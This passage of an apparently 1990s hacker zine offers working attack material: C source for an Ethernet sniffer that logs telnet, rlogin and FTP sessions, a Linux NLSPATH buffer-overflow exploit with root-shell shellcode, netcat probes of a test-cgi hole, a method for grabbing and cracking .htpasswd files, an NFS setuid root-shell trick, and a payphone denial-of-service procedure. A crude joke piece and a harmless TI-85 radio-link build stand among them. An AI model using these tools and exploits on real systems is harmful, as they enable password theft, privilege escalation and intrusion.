+{ register struct hostent *he =
+      gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET);
+
+  return( (he)?(he->h_name):(inet_ntoa(ip)) );
+}
+
+char *TCPflags(flgs)
+register u_char flgs;
+{ static char iobuf[8];
+#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-')
+
+  SFL(0,TH_FIN, 'F');
+  SFL(1,TH_SYN, 'S');
+  SFL(2,TH_RST, 'R');
+  SFL(3,TH_PUSH,'P');
+  SFL(4,TH_ACK, 'A');
+  SFL(5,TH_URG, 'U');
+  iobuf[6]=0;
+  return(iobuf);
+}
+
+char *SERVp(port)
+register u_int port;
+{ static char buf[10];
+  register char *p;
+
+   switch(port) {
+     case IPPORT_LOGINSERVER: p="rlogin"; break;
+     case IPPORT_TELNET:      p="telnet"; break;
+     case IPPORT_SMTP:        p="smtp"; break;
+     case IPPORT_FTP:         p="ftp"; break;
+     default: sprintf(buf,"%u",port); p=buf; break;
+   }
+   return(p);
+}
+
+char *Ptm(t)
+register time_t *t;
+{ register char *p = ctime(t);
+  p[strlen(p)-6]=0; /* strip " YYYY\n" */
+  return(p);
+}
+
+char *NOWtm()
+{ time_t tm;
+  time(&tm);
+  return( Ptm(&tm) );
+}
+
+#define MAX(a,b) (((a)>(b))?(a):(b))
+#define MIN(a,b) (((a)<(b))?(a):(b))
+
+/* add an item */
+#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
+  register struct CREC *CLtmp = \
+        (struct CREC *)malloc(sizeof(struct CREC)); \
+  time( &(CLtmp->Time) ); \
+  CLtmp->SRCip.s_addr = SIP.s_addr; \
+  CLtmp->DSTip.s_addr = DIP.s_addr; \
+  CLtmp->SRCport = SPORT; \
+  CLtmp->DSTport = DPORT; \
+  CLtmp->Length = MIN(LEN,MAXBUFLEN); \
+  bcopy( (u_char *)DATA, (u_char *)CLtmp->Data, CLtmp->Length); \
+  CLtmp->PKcnt = 1; \
+  CLtmp->Next = CLroot; \
+  CLtmp->Last = NULL; \
+  CLroot = CLtmp; \
+}
+
+register struct CREC *GET_NODE(Sip,SP,Dip,DP)
+register struct in_addr Sip,Dip;
+register u_int SP,DP;
+{ register struct CREC *CLr = CLroot;
+
+  while(CLr != NULL) {
+    if( (CLr->SRCport == SP) && (CLr->DSTport == DP) &&
+        IPeq(CLr->SRCip,Sip) && IPeq(CLr->DSTip,Dip) )
+            break;
+    CLr = CLr->Next;
+  }
+  return(CLr);
+}
+
+#define ADDDATA_NODE(CL,DATA,LEN) { \
+ bcopy((u_char *)DATA, (u_char *)&CL->Data[CL->Length],LEN); \
+ CL->Length += LEN; \
+}
+
+#define PR_DATA(dp,ln) {    \
+  register u_char lastc=0; \
+  while(ln-- >0) { \
+     if(*dp < 32) {  \
+        switch(*dp) { \
+            case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \
+                        break; \
+            case '\r': \
+            case '\n': fprintf(LOG,"\n     : "); \
+                        break; \
+            default  : fprintf(LOG,"^%c", (*dp + 64)); \
+                        break; \
+        } \
+     } else { \
+        if(isprint(*dp)) fputc(*dp,LOG); \
+        else fprintf(LOG,"(%d)",*dp); \
+     } \
+     lastc = *dp++; \
+  } \
+  fflush(LOG); \
+}
+
+void END_NODE(CLe,d,dl,msg)
+register struct CREC *CLe;
+register u_char *d;
+register int dl;
+register char *msg;
+{
+   fprintf(LOG,"\n-- TCP/IP LOG -- TM: %s --\n", Ptm(&CLe->Time));
+   fprintf(LOG," PATH: %s(%s) =>", Symaddr(CLe->SRCip),SERVp(CLe->SRCport));
+   fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));
+   fprintf(LOG," STAT: %s, %d pkts, %d bytes [%s]\n",
+                        NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);
+   fprintf(LOG," DATA: ");
+    { register u_int i = CLe->Length;
+      register u_char *p = CLe->Data;
+      PR_DATA(p,i);
+      PR_DATA(d,dl);
+    }
+
+   fprintf(LOG,"\n-- \n");
+   fflush(LOG);
+
+   if(CLe->Next != NULL)
+    CLe->Next->Last = CLe->Last;
+   if(CLe->Last != NULL)
+    CLe->Last->Next = CLe->Next;
+   else
+    CLroot = CLe->Next;
+   free(CLe);
+}
+
+/* 30 mins (x 60 seconds) */
+#define IDLE_TIMEOUT 1800
+#define IDLE_NODE() { \
+  time_t tm; \
+  time(&tm); \
+  if(LastTIME<tm) { \
+     register struct CREC *CLe,*CLt = CLroot; \
+     LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
+     while(CLe=CLt) { \
+       CLt=CLe->Next; \
+       if(CLe->Time <tm) \
+           END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \
+     } \
+  } \
+}
+
+void filter(cp, pktlen)
+register char *cp;
+register u_int pktlen;
+{
+ register struct ip     *ip;
+ register struct tcphdr *tcph;
+
+ { register u_short EtherType=ntohs(((struct ether_header *)cp)->ether_type);
+
+   if(EtherType < 0x600) {
+     EtherType = *(u_short *)(cp + SZETH + 6);
+     cp+=8; pktlen-=8;
+   }
+
+   if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */
+      return;
+ }
+
+    /* ugh, gotta do an alignment :-( */
+ bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH));
+
+ ip = (struct ip *)Packet;
+ if( ip->ip_p != IPPROTO_TCP) /* chuk non tcp pkts */
+    return;
+ tcph = (struct tcphdr *)(Packet + IPHLEN);
+
+ if(!( (TCPD == IPPORT_TELNET) ||
+       (TCPD == IPPORT_LOGINSERVER) ||
+       (TCPD == IPPORT_FTP)
+   )) return;
+
+ { register struct CREC *CLm;
+   register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4));
+   register u_char *p = (u_char *)Packet;
+
+   p += ((IPHLEN * 4) + (TCPOFF * 4));
+
+ if(debug) {
+  fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length);
+  fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS));
+  fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD));
+ }
+
+   if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) {
+
+      CLm->PKcnt++;
+
+      if(length>0)
+        if( (CLm->Length + length) < MAXBUFLEN ) {
+          ADDDATA_NODE( CLm, p,length);
+        } else {
+          END_NODE( CLm, p,length, "DATA LIMIT");
+        }
+
+      if(TCPFL(TH_FIN|TH_RST)) {
+          END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" );
+      }
+
+   } else {
+
+      if(TCPFL(TH_SYN)) {
+         ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
+      }
+
+   }
+
+   IDLE_NODE();
+
+ }
+
+}
+
+/* signal handler
+ */
+void death()
+{ register struct CREC *CLe;
+
+    while(CLe=CLroot)
+        END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");
+
+    fprintf(LOG,"\nLog ended at => %s\n",NOWtm());
+    fflush(LOG);
+    if(LOG != stdout)
+        fclose(LOG);
+    exit(1);
+}
+
+/* opens network interface, performs ioctls and reads from it,
+ * passing data to filter function
+ */
+void do_it()
+{
+    int cc;
+    char *buf;
+    u_short sp_ts_len;
+
+    if(!(buf=malloc(CHUNKSIZE)))
+        Pexit(1,"Eth: malloc");
+
+/* this /dev/nit initialization code pinched from etherfind */
+  {
+    struct strioctl si;
+    struct ifreq    ifr;
+    struct timeval  timeout;
+    u_int  chunksize = CHUNKSIZE;
+    u_long if_flags  = NI_PROMISC;
+
+    if((if_fd = open(NIT_DEV, O_RDONLY)) < 0)
+        Pexit(1,"Eth: nit open");
+
+    if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) < 0)
+        Pexit(1,"Eth: ioctl (I_SRDOPT)");
+
+    si.ic_timout = INFTIM;
+
+    if(ioctl(if_fd, I_PUSH, "nbuf") < 0)
+        Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    si.ic_cmd = NIOCSTIME;
+    si.ic_len = sizeof(timeout);
+    si.ic_dp  = (char *)&timeout;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");
+
+    si.ic_cmd = NIOCSCHUNK;
+    si.ic_len = sizeof(chunksize);
+    si.ic_dp  = (char *)&chunksize;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");
+
+    strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
+    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0';
+    si.ic_cmd = NIOCBIND;
+    si.ic_len = sizeof(ifr);
+    si.ic_dp  = (char *)&ifr;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");
+
+    si.ic_cmd = NIOCSFLAGS;
+    si.ic_len = sizeof(if_flags);
+    si.ic_dp  = (char *)&if_flags;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");
+
+    if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) < 0)
+        Pexit(1,"Eth: ioctl (I_FLUSH)");
+  }
+
+    while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) {
+        register char *bp = buf,
+                      *bufstop = (buf + cc);
+
+        while (bp < bufstop) {
+            register char *cp = bp;
+            register struct nit_bufhdr *hdrp;
+
+            hdrp = (struct nit_bufhdr *)cp;
+            cp += sizeof(struct nit_bufhdr);
+            bp += hdrp->nhb_totlen;
+            filter(cp, (u_long)hdrp->nhb_msglen);
+        }
+    }
+    Pexit((-1),"Eth: read");
+}
+ /* Authorize your proogie,generate your own password and uncomment here */
+/* #define AUTHPASSWD "EloiZgZejWyms" */
+
+void getauth()
+{ char *buf,*getpass(),*crypt();
+  char pwd[21],prmpt[81];
+
+    strcpy(pwd,AUTHPASSWD);
+    sprintf(prmpt,"(%s)UP? ",ProgName);
+    buf=getpass(prmpt);
+    if(strcmp(pwd,crypt(buf,pwd)))
+        exit(1);
+}
+    */
+void main(argc, argv)
+int argc;
+char **argv;
+{
+    char   cbuf[BUFSIZ];
+    struct ifconf ifc;
+    int    s,
+           ac=1,
+           backg=0;
+
+    ProgName=argv[0];
+
+ /*     getauth(); */
+
+    LOG=NULL;
+    device=NULL;
+    while((ac<argc) && (argv[ac][0] == '-')) {
+       register char ch = argv[ac++][1];
+       switch(toupper(ch)) {
+            case 'I': device=argv[ac++];
+                      break;
+            case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))
+                         Zexit(1,"Output file cant be opened\n");
+                      break;
+            case 'B': backg=1;
+                      break;
+            case 'D': debug=1;
+                      break;
+            default : fprintf(ERR,
+                        "Usage: %s [-b] [-d] [-i interface] [-f file]\n",
+                            ProgName);
+                      exit(1);
+       }
+    }
+
+    if(!device) {
+        if((s=socket(AF_INET, SOCK_DGRAM, 0)) < 0)
+            Pexit(1,"Eth: socket");
+
+        ifc.ifc_len = sizeof(cbuf);
+        ifc.ifc_buf = cbuf;
+        if(ioctl(s, SIOCGIFCONF, (char *)&ifc) < 0)
+            Pexit(1,"Eth: ioctl");
+
+        close(s);
+        device = ifc.ifc_req->ifr_name;
+    }
+
+    fprintf(ERR,"Using logical device %s [%s]\n",device,NIT_DEV);
+    fprintf(ERR,"Output to %s.%s%s",(LOG)?LogName:"stdout",
+            (debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");
+
+    if(!LOG)
+        LOG=stdout;
+
+    signal(SIGINT, death);
+    signal(SIGTERM,death);
+    signal(SIGKILL,death);
+    signal(SIGQUIT,death);
+
+    if(backg && debug) {
+         fprintf(ERR,"[Cannot bg with debug on]\n");
+         backg=0;
+    }
+
+    if(backg) {
+        register int s;
+
+        if((s=fork())>0) {
+           fprintf(ERR,"[pid %d]\n",s);
+           exit(0);
+        } else if(s<0)
+           Pexit(1,"fork");
+
+        if( (s=open("/dev/tty",O_RDWR))>0 ) {
+                ioctl(s,TIOCNOTTY,(char *)NULL);
+                close(s);
+        }
+    }
+    fprintf(LOG,"\nLog started at => %s [pid %d]\n",NOWtm(),getpid());
+    fflush(LOG);
+
+    do_it();
+}
+
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  8. Linux nlspath exploit : Solar Designer
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+ * NLSPATH buffer overflow exploit for Linux, tested on Slackware 3.1
+ * by Solar Designer, 1997.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+  "\xcd\x80/"
+  "/bin/sh"
+  "0";
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+#define bufsize 2048
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize - 4; i += 4)
+    *(char **)&buffer[i] = get_sp() - 3072;
+
+  memset(buffer, 0x90, 512);
+  memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+  buffer[bufsize - 1] = 0;
+
+  setenv("NLSPATH", buffer, 1);
+
+  execl("/bin/su", "/bin/su", NULL);
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. How to fuck over a UK payphone : so1o / NightRage
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+We found this out by total coincidence at the Bristol 2600 meeting...
+
+This is a DoS (Denial of Service) attack for payphones in the UK, it uses
+the national test number (175) and your local test number - at your local
+excahnge, which in Bristol is 17070 (I think), so you do the following...
+
+  1) Approach the telephone booth.
+  2) Pick up the handset.
+  3) Put 10p into the phone - you will get this back.
+  4) Dial your local excahnge test number.
+  5) Put the handset down.
+  6) Pick the handset up.
+  7) Dial your national exchange test number.
+  8) Listen to all the noise and shit for about 10 seconds.
+  9) Put the handset down.
+
+The LCD display in the booth will now say words to the following..
+
+  "BT Apologise, but this telephone is out of order."
+
+About 30 seconds later, the phone will return back to normal.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. Radio link for TI-85 calculators : Michael Jan
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  ********************************************************************
+  -- INTRO -----------------------------------------------------------
+  ********************************************************************
+
+  RT LINK (Radio transfer link) basicly functions like a regular
+  TI-LINK except it is wireless! The parts for making this link will 
+  cost around $15 - $20 dollars for a pair, and the frequency is adjustable.
+
+  You may post & share this plan. But please give me credit for my 
+  work (at least put my name, Michael Jan).  I TESTED this plan, they transfer
+  within the range of 30 to 50 feet. (Which is more than what I expected,
+  great!). The following are the parts you need, you can obtain them at R.S.
+			
+
+  ********************************************************************
+  -- PARTS -----------------------------------------------------------
+  ********************************************************************
+
+  PARTS           VALUE                           QUANTITY
+  --------------------------------------------------------------------
+
+  TI LINK         [TI BLACK LINK]                 1
+  (Cut Into 2)
+
+  Capacitors      [470 pF]                        2
+                  [100 pF]                        2
+                  [10  pF]                        2
+                  [4   pF]                        4
+                  [.01 uF]                        2
+                  [10  uF]                        4
+
+  Resistors       [10K Ohm]                       2
+                  [1.2K Ohm]                      2
+                  [33K Ohm]                       4
+                  [100 Ohm]                       2
+                  [180 Ohm]                       2
+
+  Transistors     [2SC1923]                       4
+
+  Coil(L)         [.27-.3]                        4
+
+  Battery Holder  [Holds 2 AA or 2 AAA]           2
+
+  Batteries       [AA or AAA]                     4
+
+  Diode           [Germanium]                     2
+
+  Copper Wire     [2 Feet]                        2
+  (Ant.)
+
+ *****************************************************************************
+ *** NOTE The Parts Are For TWO RT LINKs, Because They ONLY WORK In PAIRS! ***
+ *****************************************************************************
+
+  *******************************************************************
+  -- DIRECTIONS -----------------------------------------------------
+  *******************************************************************
+
+  1. Print Out The Schematic Diagram (The Included GIF File), It is
+     Easier To Put Parts Together.
+
+  2. Put The Parts Together By Following The Diagram (VERY IMPORTANT).
+       *** NOTE For Schematic Diagram --
+
+          Red Wire   = From TI Link
+          White Wire = From TI Link
+          (Copper Wire From TI Link Will Not Be Use)
+
+                  R  = Resistors
+                  C  = Capacitors
+                  T  = Transistors
+
+          Connect +, - To Battery Holder
+
+  3. Adjust The 4 Coil(L)s Clockwise To MAX On Both RT Links.
+     This Will Adjust The Frequences On Both LINKs To Be The Same.
+     (You Can Adjust To Any Frequence You Like Between 90MHz-100MHz)
+
+  4. Put 2 Batteries Into Both Holders
+
+  5. THAT'S IT!!!, ENJOY YOU RT-LINK !!!!  =)
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. Test-cgi holes : so1o
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Example exploit:
+----------------
+
+Below are examples, nc is netcat from avian.org. You can 
+always just telnet to port 80 and type in the GET... command.
+
+  machine% echo "GET /cgi-bin/test-cgi?/*" | nc removed.name.com 80
+
+  CGI/1.0 test script report:
+ 
+  argc is 1. argv is /\*.
+ 
+  SERVER_SOFTWARE = NCSA/1.4.1
+  SERVER_NAME = removed.name.com
+  GATEWAY_INTERFACE = CGI/1.1
+  SERVER_PROTOCOL = HTTP/0.9
+  SERVER_PORT = 80
+  REQUEST_METHOD = GET
+  HTTP_ACCEPT = 
+  PATH_INFO =
+  PATH_TRANSLATED =
+  SCRIPT_NAME = /bin/cgi-bin/test-cgi
+  QUERY_STRING = /a /bin /boot /bsd /cdrom /dev /etc /home /lib /mnt 
+  /root /sbin /stand /sys /tmp /usr /usr2 /var
+  REMOTE_HOST = remote.machine.com
+  REMOTE_ADDR = 255.255.255.255
+  REMOTE_USER =
+  AUTH_TYPE =
+  CONTENT_TYPE =
+  CONTENT_LENGTH =
+ 
+...Or to see what other cgi-goodies are still floating around...
+
+  machine% echo "GET /cgi-bin/test-cgi?*" | nc removed.name.com 80
+
+  CGI/1.0 test script report:
+ 
+  argc is 1. argv is \*.
+
+  SERVER_SOFTWARE = NCSA/1.4.1
+  SERVER_NAME = removed.name.com
+  GATEWAY_INTERFACE = CGI/1.1
+  SERVER_PROTOCOL = HTTP/0.9
+  SERVER_PORT = 80
+  REQUEST_METHOD = GET
+  HTTP_ACCEPT = 
+  PATH_INFO =
+  PATH_TRANSLATED =
+  SCRIPT_NAME = /bin/cgi-bin/test-cgi
+  QUERY_STRING = calendar cgi-archie cgi-calendar cgi-date cgi-finger 
+  cgi-fortune cgi-lib.pl imagemap imagemap.cgi imagemap.conf index.html 
+  mail-query mail-query-2 majordomo majordomo.cf marker.cgi 
+  menu message.cgi munger.cgi munger.note ncsa-default.tar post-query 
+  query smartlist.cf src subscribe.cf test-cgi uptime
+  REMOTE_HOST = remote.machine.com
+  REMOTE_ADDR = 255.255.255.255 
+  REMOTE_USER =
+  AUTH_TYPE =
+  CONTENT_TYPE =
+  CONTENT_LENGTH =
+
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. Tree raping : digitalboy [DD]
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Tree raping can be an exciting and fulfilling hobby, as long as the 
+proper safety precautions are taken. This file will try to outline the 
+process of tree raping, as well as give you some background on the sport of 
+tree raping.
+
+\|/ History \|/
+
+Tree raping originated in Eastern Africa long before history was recorded.
+It was practiced by tribes of natives who used it as a test to determine the 
+tribal chief. He who could rape the most trees was surely the most powerful, 
+and therefore the rightful leader.
+
+The sexual molestation of trees was kept a tribal secret, and no outsiders
+learned of the practice until the late 1800's when Spanish explorer Hernando 
+Ferdinando Enriquez happened to witness the event. He was killed by the 
+natives he had been watching, but before his death he wrote of it in his 
+journal. In 1937, a nun found the journal and the methods of tree raping were 
+spread to the rest of the civilized world.
+
+\|/ Preparation \|/
+
+Tree raping is not something you can just go out and do. You must be
+prepared. First and foremost, find a forest. While some of the best trees are 
+found in urban settings, violating them will usually land you in the city 
+jail. Not to mention the public ridicule. No, this is an activity that must 
+take place in a relatively secluded part of a forest. Bring a few friends if 
+that is your fancy, but large tree raping orgies usually lessen the 
+enjoyment. You must also bring a large vat of maple syrup and possible 
+climbing equipment, this will be explained later.
+
+\|/ Tree Selection \|/
+
+Picking the right tree to violate is essential. If you pick the wrong
+tree, you could end up feeling inadequate, as well as inflicting serious 
+physical injury upon yourself. Everyone has their own preference as to what 
+type of tree to choose, but there are some general guidelines. The most vital
+factor you have to consider is the position of knotholes. If a knothole is 
+not present, you may be forced to create your own. Any seasoned tree rapist 
+always carries his trusty power drill. Also, be sure to measure the depth of 
+the knothole. The texture of the bark is also important. Extremely rough bark 
+can ruin your experience. Try to find a tree with smooth bark, such as a 
+birch. Note that you are not limited to the part of the tree at ground level. 
+Bring some climbing equipment and you can easily reach the desired level.
+
+\|/ The Act Of Tree Raping \|/
+
+Tree raping always has and always must be done in complete nudity. Now,
+remember that you were required to bring along a vat of maple syrup. This 
+object will now come into play. First, heat it to exactly 54.7 degrees 
+Celsius. Next lift the syrup over your head and pour it over your body. Count 
+to 112, then lie down and roll around on the forest floor. You are now ready 
+to begin the ritual. Approach the tree you have picked while screaming "TSAK 
+NARP FNORZA QKWT" as loud as possible. Penetrate the tree and proceed to 
+violate it. Try to keep moving, the maple syrup can be a powerful bonding 
+agent. When you are finished you will have to find your own method of 
+removing the maple syrup. 
+
+\|/ The End \|/
+
+Avoid Pine trees AT ALL COSTS!
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  3. .htpasswd + .htaccess : Cain [DD]
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Well, I'm back. I should have put this article out last month, but I
+neglected to. Flames to /dev/null. Well anyway, you know how sometimes when
+you connect to a web page, you are asked for a username and password? Well,
+here's how that works. In a directory there is a file almost always called
+.htpasswd. And in another directory(or possibly that same one) there is a
+file called .htaccess. The .htpasswd file follows basically the same format as
+the /etc/passwd file:
+
+   jblow:F#.DG*m38d%RF
+   cain:GJA54j.3g9#$@f
+
+and the .htaccess file follows this format:
+
+  AuthUserFile /path/to/.htpasswd
+  <LIMIT GET PUT POST>
+  require user <user>
+  </LIMIT>
+
+If there is an .htaccess file in a directory, you must have a valid username
+and password to view any files in that directory.
+
+So here is what happens, the httpd sees the .htaccess file in the directory
+that you request a file from. It finds the location of the .htpasswd file and
+then find out who has access to the files in the directory. Therefore you
+must have a username and password. Well here's the bug:
+
+Only the files in the directory with the .htaccess file are passworded. So
+if the .htpasswd file is somewhere else (root directory maybe) then you can
+read that file. It uses the same form as /etc/passwd so therefore password
+crackers will work on this also. Insta hack if the webmaster doesn't know
+what he's doing.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  4. Simple NFS skills : Cain [DD]
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+You are searching around for a system to hack. One of the things you should
+check is whether they export any of the directories to everyone. Unfortunately
+you need a shell on the system to do this. But if you do, then this is an
+easy way to get root.
+
+Your local system:
+
+   # showmount -r remote.com
+        Export list for remote.com:
+        /var/lib/stuff (everyone)
+   # mount remote.com:/var/lib/stuff /mnt
+   # cp hackprog /mnt
+   # chown root.root /mnt/hackprog
+   # chmod 4701 /mnt/hackprog
+   # umount /mnt
+
+Their system:
+
+   $ cd /var/lib/stuff
+   $ hackprog
+   bash#
+
+I chose the directories at random. But if you see anything like
+
+        /path/to/exported/directory (everyone)
+
+in a showmount -r listing, you can mount that directory and have complete
+access(read, write, execute) to that directory. So if you put a rewting
+proggy:
+   
+main()
+   {
+   setuid(0);
+   setgid(0);
+   system("/bin/sh");
+   }
+
+and make the owner root and chmod it to 4701(setuid) then you can run that
+program from the system exporting that directory and get a rewt shell.
+Unfortunately you must be root to mount an NFS, otherwise every system you got
+on, you could obtain a rewt shell. But oh well.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. LOPHT.COM : so1o
